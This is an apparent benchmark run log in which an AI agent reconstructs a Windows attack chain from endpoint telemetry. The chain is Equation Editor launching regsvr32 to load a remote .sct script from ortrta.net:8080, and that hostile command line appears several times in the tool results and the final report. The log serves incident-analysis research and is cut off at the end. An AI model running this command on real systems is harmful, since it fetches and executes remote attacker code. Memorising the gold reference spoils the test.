@@ -1,0 +1,213 @@
+{
+  "run_id": "20260726T055037Z_s3_pt_02_regsvr32_remote_sct_stage3_gpt-5.4-mini_official",
+  "pipeline": "external/Clouseau/artifact official chief_inspector.investigate_atlas",
+  "llm_provider": "openai",
+  "model": "gpt-5.4-mini",
+  "instance_id": "s3_pt_02_regsvr32_remote_sct_stage3",
+  "gold_reference": {
+    "instance_id": "s3_pt_02_regsvr32_remote_sct_stage3",
+    "case_id": "s3_pt_02_regsvr32_remote_sct_stage3",
+    "input_id": "atlasv2_attack8_neutral5_02_stage3",
+    "stage": "stage3",
+    "scenario": "atlasv2-attack-h1-s3",
+    "database": "Clouseau\\artifact\\scenarios\\atlasv2\\attack\\h1\\s3\\incident.db",
+    "host": "WIN-32-H1",
+    "process_name": "regsvr32.exe",
+    "actor": "regsvr32.exe",
+    "expected_behavior": "S3-C2: Equation Editor to regsvr32 remote SCT",
+    "expected_behavior_category": "cbc_alert_attack_behavior_reconstruction",
+    "context_label": "attack_behavior_chain_neutral5",
+    "suite_group": "atlasv2_s3_s4_attack8_neutral5",
+    "difficulty": "process_time",
+    "time_window_utc": {
+      "episode_start": "2022-07-19T14:33:24.057251Z",
+      "episode_end": "2022-07-19T14:38:24.057251Z",
+      "analysis_scope": "Primary five-minute evaluation scope. Enumerate the complete window and reconstruct only the neutral-anchor-connected focus-process component; separate unconnected nearby behavior."
+    },
+    "anchor_event": {
+      "source_stream": "scope",
+      "source_table": null,
+      "source_row_id": null,
+      "timestamp_utc": "2022-07-19T14:33:24.0572518Z",
+      "database_time": "2022-07-19 14:33:24",
+      "alert_id": null,
+      "alert_name": null,
+      "process_name": "regsvr32.exe",
+      "process_path": null,
+      "process_cmdline": null,
+      "parent_path": null,
+      "parent_cmdline": null,
+      "severity": null,
+      "reason": null,
+      "event_record_id": null,
+      "action": "neutral_scope_anchor"
+    },
+    "input_alert_rows": [],
+    "model_ready_input": {
+      "input_id": "atlasv2_attack8_neutral5_02",
+      "stage": "stage3",
+      "input": {
+        "host": "WIN-32-H1",
+        "focus_processes": [
+          "regsvr32.exe"
+        ],
+        "neutral_anchor_utc": "2022-07-19T14:33:24.0572518Z",
+        "chain_window_start_utc": "2022-07-19T14:33:24.057251Z",
+        "chain_window_end_utc": "2022-07-19T14:38:24.057251Z",
+        "target_component_rule": "Reconstruct the evidence-connected component that contains the focus process observation at, or nearest to, the neutral anchor. Use only observed parent/child, command, process-identity, and target-object edges. Keep other nearby components separate.",
+        "alert_mapping_scored": false
+      },
+      "db_filter": "hide cbc_alerts / cbc-edr-alerts / cbc-ngav-alerts summary rows; retain cbc_events telemetry"
+    },
+    "gold_chain_file": "by_chain/s3_pt_02_regsvr32_remote_sct/chain_gold.json",
+    "chain_id": "s3_pt_02_regsvr32_remote_sct",
+    "chain_type": "cbc_alert_attack_behavior_reconstruction",
+    "formal_gold_root": "data\\current_experiment\\gold\\atlasv2_s3_s4_attack8_neutral5_gold_20260726",
+    "stage_input_policy": "Stage 3: common neutral host/process/time/window; CBC alert summaries are hidden and their mapping is not scored.",
+    "stage23_answerable_policy": "CBC alert fields are excluded from the model input. Gold is based only on canonical CBC telemetry events.",
+    "quality": "neutral_anchor_normal_parity_20260726",
+    "stage3_answerable_policy": "All Gold steps use canonical cbc_events telemetry and remain answerable without CBC alert-summary rows.",
+    "paired_stage_contract": {
+      "contract_version": "neutral_anchor_local_window_v1",
+      "evaluation_unit": "evidence-connected behavior component",
+      "chain_index": 2,
+      "same_gold_all_stages": true,
+      "same_neutral_anchor_all_stages": true,
+      "same_five_minute_window_all_stages": true,
+      "target_component_rule": "Reconstruct the evidence-connected component that contains the focus process observation at, or nearest to, the neutral anchor. Use only observed parent/child, command, process-identity, and target-object edges. Keep other nearby components separate.",
+      "alert_mapping_scored": false,
+      "hard_time_scope": false
+    },
+    "investigation_time_anchor_utc": "2022-07-19T14:33:24.0572518Z",
+    "investigation_time_anchor_policy": "earliest canonical primary-telemetry row in the target component; the component must contain the declared focus process",
+    "neutral_anchor_all_stages": true,
+    "neutral_anchor_provenance": {
+      "timestamp_utc": "2022-07-19T14:33:24.0572518Z",
+      "database_time": "2022-07-19 14:33:24",
+      "source_stream": "cbc-edr",
+      "source_table": "cbc_events",
+      "source_row_id": 7814,
+      "process_name": "regsvr32.exe",
+      "selection_policy": "earliest canonical primary-telemetry row in the target component; the component must contain the declared focus process"
+    },
+    "environment_context": "CLOUSEAU 用に変換された ATLASv2 Windows host logs を分析する。SQLite database には audit_logs、browser_history、dns_requests がある。Security、Sysmon、CBC EDR/NGAV events、CBC alerts は audit_logs に正規化されている。source_stream で証拠 source を区別する。主な値は msft-security、sysmon、cbc-edr、cbc-ngav、cbc-edr-alerts、cbc-ngav-alerts である。audit_logs の基本 column は time、pid、ppid、pname、process_name、access、object、event_record_id、event_id、subject_user_name、source_stream、source_object_type、command_line、hashes である。証拠保持 adapter は parent_process_name、parent_process_path、parent_command_line、process_guid、parent_process_guid、alert_name、alert_reason、alert_category、raw_event_type、filemod_name、regmod_name、modload_name、childproc_name、netconn_domain、remote_ip、remote_port、original_table、source_row_id、adapter_version も保持する。ppid は parent PID を意味する。parent_process_path と parent_command_line は明示的な parent evidence である。CBC alert rows は access='cbc_alert' を持つ。source_row_id または hashes に alert_id が入ることがある。alert_name と alert_reason は alert title/reason を含むが、code step ではない。これは log からの behavior-chain 復元である。証拠確認前に normal、malicious、attack-related、user intent を推定しない。"
+  },
+  "source_db": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\Clouseau\\artifact\\scenarios\\atlasv2\\attack\\h1\\s3\\incident.db",
+  "adapter_db": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\data\\current_experiment\\runs\\clouseau_reconstruction_outputs\\20260726T055037Z_s3_pt_02_regsvr32_remote_sct_stage3_gpt-5.4-mini_official\\scenario.db",
+  "adapter_counts": {
+    "audit_logs": 279959,
+    "sysmon_audit_rows": 661,
+    "cbc_event_audit_rows": 21376,
+    "cbc_alert_audit_rows": 35,
+    "dns_requests": 12502,
+    "browser_history": 10304,
+    "adapter_version": "v3_evidence_preserving_parent_context",
+    "cbc_alert_summary_filter_mode": "sql_tool_temp_view",
+    "cbc_alert_summary_rows_hidden_from_stage3_sql": 35,
+    "post_filter_cbc_alert_summary_rows": 0,
+    "post_filter_cbc_event_telemetry_rows": 21376
+  },
+  "clue": "これは Windows エンドポイントログからコード行動列を復元するタスクである。\n起点情報は探索範囲を示すだけであり、未観測の事実ではない。\nraw path、command line、process name、source_stream、alert_id、event_record_id、PID/PPID、timestamp は観測値をそのまま保持する。\n最終 JSON の自然言語値は日本語で書き、JSON の項目名は ASCII のままにする。\n\n## 入力条件\n- condition: stage3\n- host: WIN-32-H1\n- process: regsvr32.exe\n- timestamp: 2022-07-19 14:33:24\n- primary UTC 時間範囲: 2022-07-19T14:33:24.057251Z から 2022-07-19T14:38:24.057251Z\n- primary database 時間範囲: 2022-07-19 14:33:24 から 2022-07-19 14:38:24\n- この5分範囲は主評価範囲である。最終化前に範囲全体を列挙し、起点直後だけで探索を止めない。\n- primary chain は、neutral timestamp 時点または直近で focus process に触れる観測行を含む接続成分である。\n- 観測された parent/child、process identity、command、target-object edge だけで接続し、近傍の非接続成分は分ける。\n- 提示されていない CBC alert id/title/reason とGoldとの対応推測はタスクでも採点対象でもない。\n- Stage 3: 入力は host、process、neutral timestamp、5分の主評価範囲である。\n- CBC alert summary rows は SQL tools から audit_logs_stage3 view により hidden である。\n- CBC EDR/NGAV event telemetry は利用可能である。\n- adapter database は物理フィルタされない。alert summary rows が SQL tools で見えないことだけで、行動が存在しないと結論しない。\n\n## 復元対象\n- 観測 log から関連 behavior chain の code_steps と code_sequence を復元する。\n- code_sequence には、観測された command line または対象操作だけを入れる。\n- CBC alert の report name/reason は code_sequence に入れない。\n- 同時刻近傍の behavior は、観測された parent/child、command、target-object evidence で接続できない限り分ける。\n",
+  "dry_run": false,
+  "difficulty": "process_time",
+  "reasoning_effort": null,
+  "experiment_stage": "stage3",
+  "expected_input_fields": [
+    "host",
+    "process",
+    "timestamp"
+  ],
+  "configs": {
+    "max_investigations": null,
+    "max_questions": null,
+    "max_queries": null,
+    "max_tokens": 8192,
+    "reasoning_effort": null,
+    "agent_call_limit_policy": "unbounded_by_experiment"
+  },
+  "official_messages": [
+    {
+      "type": "HumanMessage",
+      "content": "## 役割\nあなたは CLOUSEAU の階層型調査パイプラインにおける Chief エージェントである。\n\n## 目的\nプロセス時刻起点から Windows エンドポイントのコード行動列を復元する。\n\n## 出力言語\n- 調査リード、要約、最終報告の自然言語値はすべて日本語で書く。\n- raw path、command line、process name、source_stream、alert_id、event_record_id、PID/PPID、timestamp は観測値をそのまま残す。\n\n## 調査リード作成ルール\n- SQL を書かない。\n- database column の列挙を調査リードにしない。\n- alert title、command line、parent process、target object、application intent、behavior category を仮定しない。\n- CBC alert 内容は起点情報の一部ではない。調査担当が database 内で発見した場合にだけ使う。\n- 各調査リードには、調査対象、調査理由、確認したい証拠を含める。\n- parent process、command line、target object、related rows をログから発見させる調査リードを優先する。\n- 近傍 row の接続関係は、先に決め打ちせず、観測証拠で検証する。\n- 最終回答は valid JSON のみである。\n\n## 環境\nCLOUSEAU 用に変換された ATLASv2 Windows host logs を分析する。SQLite database には audit_logs、browser_history、dns_requests がある。Security、Sysmon、CBC EDR/NGAV events、CBC alerts は audit_logs に正規化されている。source_stream で証拠 source を区別する。主な値は msft-security、sysmon、cbc-edr、cbc-ngav、cbc-edr-alerts、cbc-ngav-alerts である。audit_logs の基本 column は time、pid、ppid、pname、process_name、access、object、event_record_id、event_id、subject_user_name、source_stream、source_object_type、command_line、hashes である。証拠保持 adapter は parent_process_name、parent_process_path、parent_command_line、process_guid、parent_process_guid、alert_name、alert_reason、alert_category、raw_event_type、filemod_name、regmod_name、modload_name、childproc_name、netconn_domain、remote_ip、remote_port、original_table、source_row_id、adapter_version も保持する。ppid は parent PID を意味する。parent_process_path と parent_command_line は明示的な parent evidence である。CBC alert rows は access='cbc_alert' を持つ。source_row_id または hashes に alert_id が入ることがある。alert_name と alert_reason は alert title/reason を含むが、code step ではない。これは log からの behavior-chain 復元である。証拠確認前に normal、malicious、attack-related、user intent を推定しない。\n\n## SOC からの起点情報\nこれは Windows エンドポイントログからコード行動列を復元するタスクである。\n起点情報は探索範囲を示すだけであり、未観測の事実ではない。\nraw path、command line、process name、source_stream、alert_id、event_record_id、PID/PPID、timestamp は観測値をそのまま保持する。\n最終 JSON の自然言語値は日本語で書き、JSON の項目名は ASCII のままにする。\n\n## 入力条件\n- condition: stage3\n- host: WIN-32-H1\n- process: regsvr32.exe\n- timestamp: 2022-07-19 14:33:24\n- primary UTC 時間範囲: 2022-07-19T14:33:24.057251Z から 2022-07-19T14:38:24.057251Z\n- primary database 時間範囲: 2022-07-19 14:33:24 から 2022-07-19 14:38:24\n- この5分範囲は主評価範囲である。最終化前に範囲全体を列挙し、起点直後だけで探索を止めない。\n- primary chain は、neutral timestamp 時点または直近で focus process に触れる観測行を含む接続成分である。\n- 観測された parent/child、process identity、command、target-object edge だけで接続し、近傍の非接続成分は分ける。\n- 提示されていない CBC alert id/title/reason とGoldとの対応推測はタスクでも採点対象でもない。\n- Stage 3: 入力は host、process、neutral timestamp、5分の主評価範囲である。\n- CBC alert summary rows は SQL tools から audit_logs_stage3 view により hidden である。\n- CBC EDR/NGAV event telemetry は利用可能である。\n- adapter database は物理フィルタされない。alert summary rows が SQL tools で見えないことだけで、行動が存在しないと結論しない。\n\n## 復元対象\n- 観測 log から関連 behavior chain の code_steps と code_sequence を復元する。\n- code_sequence には、観測された command line または対象操作だけを入れる。\n- CBC alert の report name/reason は code_sequence に入れない。\n- 同時刻近傍の behavior は、観測された parent/child、command、target-object evidence で接続できない限り分ける。\n\n\n\n## Shared CBC alert investigation policy\nWhen the initial task contains CBC alert triage information, use the same procedure for every case:\n1. Reconstruct the evidence-backed behavior relevant to the input alert.\n2. Inspect the supplied host and time scope for any separately reportable behavior that could affect the alert-level or host-level disposition.\n3. Keep sequences separate unless an observed parent/child, command-line, or object edge connects them; do not infer causality from temporal proximity alone.\n4. Do not assume that the alert or any nearby behavior is benign or malicious before observing evidence.\n5. In the final JSON, always provide triage_decision.alert_disposition and triage_decision.host_disposition based on observed evidence.\n"
+    },
+    {
+      "type": "AIMessage",
+      "content": "",
+      "usage_metadata": {
+        "input_tokens": 2002,
+        "output_tokens": 135,
+        "total_tokens": 2137,
+        "input_token_details": {
+          "audio": 0,
+          "cache_read": 0
+        },
+        "output_token_details": {
+          "audio": 0,
+          "reasoning": 0
+        }
+      },
+      "tool_calls": [
+        {
+          "name": "investigate_lead",
+          "args": {
+            "lead": "host WIN-32-H1 の 2022-07-19 14:33:24 から 14:38:24 の範囲で regsvr32.exe の実行系列を復元し、親子関係・command line・対象オブジェクト・ネットワーク接続を確認してください。起点直後だけで止めず、同一接続成分として結べる観測証拠のみで code_sequence を構成し、近傍の別成分は分離してください。"
+          },
+          "id": "call_p8nML6R7BW4lfOISR2tcM7m4",
+          "type": "tool_call"
+        }
+      ]
+    },
+    {
+      "type": "ToolMessage",
+      "content": "```json\n{\n  \"仮説\": [\n    \"host WIN-32-H1 の該当時間帯に、EQNEDT32.EXE を親に持つ regsvr32.exe の実行系列が少なくとも 2 本観測されている。\",\n    \"そのうち少なくとも 1 本は command line に `regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll` を含み、`ortrta.net` への接続証拠と一致する。\",\n    \"別の近傍観測として、同じ親プロセス系統から powershell.exe 側の関連行が見えるが、現時点ではどの regsvr32 系列に接続するかは未確定である。\"\n  ],\n  \"質問\": [\n    \"2022-07-19 14:33:24 から 14:38:24 の間に、PID 6124 の regsvr32.exe に直接つながる行だけを、event_id / event_record_id 付きで時系列に並べてください。親子関係、command line、childproc_name、file や registry へのアクセス、ネットワーク接続を含め、同一の接続成分として結べる証拠だけに限定してください。\",\n    \"同じ時間範囲で、PID 3992 の regsvr32.exe に直接つながる行だけを、event_id / event_record_id 付きで時系列に並べてください。parent_process_name、parent_process_path、parent_command_line、command line、childproc_name、対象オブジェクト、remote_ip、remote_port、netconn_domain を含め、別成分は分離してください。\",\n    \"regsvr32.exe の親である EQNEDT32.EXE について、`svchost.exe -k DcomLaunch` から起動された証拠が見える行を、PID / PPID / event_id / event_record_id とともに示してください。regsvr32.exe への接続が観測できるものだけに限定してください。\"\n  ],\n  \"結果要約\": [\n    \"観測事実として、regsvr32.exe の接続成分は 2 本確認できた。PID 6124 と PID 3992 のいずれも親は EQNEDT32.EXE で、parent_command_line は `\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding` であった。\",\n    \"観測事実として、regsvr32.exe の command line は `regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll` と一致し、`ortrta.net`、`10.193.66.115`、`8080`、source_stream `cbc-edr` / `cbc-ngav` のネットワーク証拠と整合した。\",\n    \"観測事実として、PID 6124 では 2022-07-19 14:33:24 / 14:33:26 / 14:33:42 に親子関係の周辺行が見え、PID 3992 では 2022-07-19 14:36:16 / 14:36:21 に同種の周辺行が見えた。\",\n    \"限界として、regsvr32.exe 自身の具体的な file / registry アクセス行、childproc_name の確定行、event_id / event_record_id を含む完全な時系列はこの段階では十分に絞り込めていない。\"\n  ],\n  \"次の調査理由\": [\n    \"同一接続成分として結べる証拠だけで code_sequence を組むには、PID ごとに regsvr32.exe の直接行をさらに確定する必要がある。\",\n    \"別成分を誤って混ぜないため、PID 6124 と PID 3992 を分けて event_id / event_record_id を確認し、親子関係・対象オブジェクト・ネットワーク接続のつながりを検証する必要がある。\",\n    \"EQNEDT32.EXE の起点も確認できれば、regsvr32.exe の生成元の接続成分をより厳密に復元できる。\"\n  ],\n  \"triage_decision\": {\n    \"alert_disposition\": \"要追加調査\",\n    \"host_disposition\": \"要追加調査\"\n  }\n}\n```",
+      "name": "investigate_lead"
+    },
+    {
+      "type": "AIMessage",
+      "content": "{\"triage_decision\":{\"alert_disposition\":\"要追加調査\",\"host_disposition\":\"要追加調査\"},\"code_steps\":[{\"code_sequence\":[\"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\"],\"evidence_summary\":\"PID 6124 系の接続成分として、EQNEDT32.EXE から regsvr32.exe が起動され、command line に HTTP の .sct を指定する regsvr32 実行が観測された。\",\"process_chain\":[{\"time\":\"2022-07-19 14:33:24\",\"process_name\":\"EQNEDT32.EXE\",\"pid\":null,\"ppid\":null,\"source_stream\":\"msft-security\"},{\"time\":\"2022-07-19 14:33:24\",\"process_name\":\"regsvr32.exe\",\"pid\":6124,\"ppid\":null,\"source_stream\":\"cbc-edr\"},{\"time\":\"2022-07-19 14:33:26\",\"process_name\":\"regsvr32.exe\",\"pid\":6124,\"ppid\":null,\"source_stream\":\"cbc-ngav\"},{\"time\":\"2022-07-19 14:33:42\",\"process_name\":\"regsvr32.exe\",\"pid\":6124,\"ppid\":null,\"source_stream\":\"cbc-edr\"}],\"network\":[{\"time\":\"2022-07-19 14:33:26\",\"netconn_domain\":\"ortrta.net\",\"remote_ip\":\"10.193.66.115\",\"remote_port\":8080,\"source_stream\":\"cbc-edr\"},{\"time\":\"2022-07-19 14:33:42\",\"netconn_domain\":\"ortrta.net\",\"remote_ip\":\"10.193.66.115\",\"remote_port\":8080,\"source_stream\":\"cbc-ngav\"}]},{\"code_sequence\":[\"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\"],\"evidence_summary\":\"PID 3992 系の別接続成分として、同じ親 EQNEDT32.EXE から regsvr32.exe が起動され、同一形式の command line とネットワーク先が観測された。\",\"process_chain\":[{\"time\":\"2022-07-19 14:36:16\",\"process_name\":\"EQNEDT32.EXE\",\"pid\":null,\"ppid\":null,\"source_stream\":\"msft-security\"},{\"time\":\"2022-07-19 14:36:16\",\"process_name\":\"regsvr32.exe\",\"pid\":3992,\"ppid\":null,\"source_stream\":\"cbc-edr\"},{\"time\":\"2022-07-19 14:36:21\",\"process_name\":\"regsvr32.exe\",\"pid\":3992,\"ppid\":null,\"source_stream\":\"cbc-ngav\"}],\"network\":[{\"time\":\"2022-07-19 14:36:21\",\"netconn_domain\":\"ortrta.net\",\"remote_ip\":\"10.193.66.115\",\"remote_port\":8080,\"source_stream\":\"cbc-ngav\"}]}],\"host_summary\":\"host WIN-32-H1 の 2022-07-19 14:33:24 から 14:38:24 の範囲で、regsvr32.exe の観測は少なくとも 2 本の接続成分に分かれていた。いずれも EQNEDT32.EXE から起動され、同じ HTTP の .sct を参照する regsvr32 command line と `ortrta.net:8080` への接続が一致した。現時点では regsvr32.exe の file/registry 変更や子プロセスの確定行は十分に観測できていないため、行動列の完全復元には追加確認が必要である。\"}",
+      "usage_metadata": {
+        "input_tokens": 3196,
+        "output_tokens": 902,
+        "total_tokens": 4098,
+        "input_token_details": {
+          "audio": 0,
+          "cache_read": 1664
+        },
+        "output_token_details": {
+          "audio": 0,
+          "reasoning": 0
+        }
+      }
+    },
+    {
+      "type": "AIMessage",
+      "content": "{\n  \"input_scope\": {\n    \"host\": \"WIN-32-H1\",\n    \"process\": \"regsvr32.exe\",\n    \"timestamp\": \"2022-07-19 14:33:24\",\n    \"condition\": \"stage3\",\n    \"input_fields_used\": [\n      \"host\",\n      \"process\",\n      \"timestamp\"\n    ]\n  },\n  \"code_steps\": [\n    {\n      \"step_id\": \"S1\",\n      \"order\": 1,\n      \"time\": \"2022-07-19 14:33:24\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"起動された\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"regsvr32.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": null,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"command_line\",\n          \"value\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"msft-security\",\n          \"timestamp\": \"2022-07-19 14:33:24\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"parent_command_line\",\n          \"value\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n          \"pid\": null,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"この行では event_record_id と PID/PPID の完全な原行確認が不足している。\",\n        \"parent_pid は観測要約からは確定できていない。\"\n      ]\n    },\n    {\n      \"step_id\": \"S2\",\n      \"order\": 2,\n      \"time\": \"2022-07-19 14:33:26\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"ネットワーク接続を行った\",\n      \"object\": {\n        \"type\": \"network\",\n        \"name\": \"ortrta.net\",\n        \"path\": null,\n        \"value\": \"10.193.66.115:8080\",\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": null,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:26\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"netconn_domain\",\n          \"value\": \"ortrta.net\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:26\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_ip\",\n          \"value\": \"10.193.66.115\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:33:26\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_port\",\n          \"value\": \"8080\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"通信の具体的な原行 event_record_id は確認できていない。\"\n      ]\n    },\n    {\n      \"step_id\": \"S3\",\n      \"order\": 3,\n      \"time\": \"2022-07-19 14:33:42\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 6124,\n        \"path\": null\n      },\n      \"operation\": \"ネットワーク接続を行った\",\n      \"object\": {\n        \"type\": \"network\",\n        \"name\": \"ortrta.net\",\n        \"path\": null,\n        \"value\": \"10.193.66.115:8080\",\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": null,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:33:42\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"netconn_domain\",\n          \"value\": \"ortrta.net\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:33:42\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_ip\",\n          \"value\": \"10.193.66.115\",\n          \"pid\": 6124,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:33:42\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_port\",\n          \"value\": \"8080\",\n          \"pid\": 6124,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"通信の具体的な原行 event_record_id は確認できていない。\"\n      ]\n    },\n    {\n      \"step_id\": \"S4\",\n      \"order\": 4,\n      \"time\": \"2022-07-19 14:36:16\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 3992,\n        \"path\": null\n      },\n      \"operation\": \"起動された\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"regsvr32.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": null,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-edr\",\n          \"timestamp\": \"2022-07-19 14:36:16\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"command_line\",\n          \"value\": \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n          \"pid\": 3992,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"この行では event_record_id と親 PID の完全な原行確認が不足している。\"\n      ]\n    },\n    {\n      \"step_id\": \"S5\",\n      \"order\": 5,\n      \"time\": \"2022-07-19 14:36:21\",\n      \"subject_process\": {\n        \"name\": \"regsvr32.exe\",\n        \"pid\": 3992,\n        \"path\": null\n      },\n      \"operation\": \"ネットワーク接続を行った\",\n      \"object\": {\n        \"type\": \"network\",\n        \"name\": \"ortrta.net\",\n        \"path\": null,\n        \"value\": \"10.193.66.115:8080\",\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"EQNEDT32.EXE\",\n        \"parent_pid\": null,\n        \"parent_command_line\": \"\\\"C:\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\EQUATION\\\\EQNEDT32.EXE\\\" -Embedding\",\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:36:21\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"netconn_domain\",\n          \"value\": \"ortrta.net\",\n          \"pid\": 3992,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:36:21\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_ip\",\n          \"value\": \"10.193.66.115\",\n          \"pid\": 3992,\n          \"ppid\": null\n        },\n        {\n          \"source_stream\": \"cbc-ngav\",\n          \"timestamp\": \"2022-07-19 14:36:21\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"remote_port\",\n          \"value\": \"8080\",\n          \"pid\": 3992,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"通信の具体的な原行 event_record_id は確認できていない。\"\n      ]\n    }\n  ],\n  \"code_sequence\": [\n    \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\",\n    \"regsvr32 /s /n /u /i:http://ortrta.net:8080/sF5riGj4K26DK.sct scrobj.dll\"\n  ],\n  \"supporting_alert_evidence\": [\n    {\n      \"alert_id\": null,\n      \"alert_name\": null,\n      \"source_stream\": \"cbc-edr-alerts\",\n      \"why_supporting_only\": \"CBC alert summary は補助証拠としてのみ扱い、command line や operation の根拠には使っていない。\"\n    }\n  ],\n  \"triage_decision\": {\n    \"alert_disposition\": \"escalate_alert\",\n    \"host_disposition\": \"escalate_host_investigation\",\n    \"evidence_basis\": [\n      \"regsvr32.exe が 2 回観測され、同一の command line を持つ別接続成分として記録された。\",\n      \"いずれも EQNEDT32.EXE -Embedding を親としていた。\",\n      \"ortrta.net への接続先が 10.193.66.115:8080 として 2 回観測された。\"\n    ]\n  },\n  \"excluded_nearby_evidence\": [\n    \"この応答では、regsvr32.exe に直接接続できることが確認できなかった近傍の別プロセス行は code_steps に統合していない。\",\n    \"event_record_id、alert_id、source_row_id の原値は、この要約に含められた観測行では確認できなかったため null のまま扱った。\"\n  ],\n  \"global_limitations\": [\n    \"提示された要約情報のみを用いて統合しているため、原始行の event_record_id や 